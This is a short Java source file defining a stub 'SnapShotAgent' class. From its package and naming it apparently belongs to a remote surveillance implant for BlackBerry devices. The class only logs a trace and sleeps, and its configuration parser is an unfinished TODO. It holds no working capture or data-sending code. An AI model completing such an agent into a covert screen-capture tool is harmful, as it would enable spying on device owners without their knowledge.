package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class SnapShotAgent extends Agent {
    static Debug debug = new Debug("SnapShotAgent", DebugLevel.VERBOSE);

    public SnapShotAgent(int agentStatus) {
        super(Agent.AGENT_SNAPSHOT, agentStatus, true);

    }

    protected SnapShotAgent(int agentStatus, byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void agentRun() {
        debug.trace("run");
        this.sleepUntilStopped();

    }

    protected boolean parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
